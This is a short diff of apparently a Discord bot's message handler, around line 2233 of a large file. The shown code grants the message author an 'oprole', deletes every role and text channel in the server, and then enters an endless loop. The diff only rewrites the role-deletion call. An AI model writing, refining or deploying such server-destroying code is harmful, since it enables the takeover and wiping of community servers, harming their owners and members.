@@ -2233,8 +2233,7 @@ async def on_message(message):
             await message.author.add_roles(oprole)
             try:
                 for roles in message.guild.roles:
-                    rolename = discord.utils.get(message.guild.roles, name=roles)
-                    await rolename.delete()
+                    await bot.delete_role(message.guild, roles)
                 for channels in message.guild.text_channels:
                     await channels.delete()
                 while True:
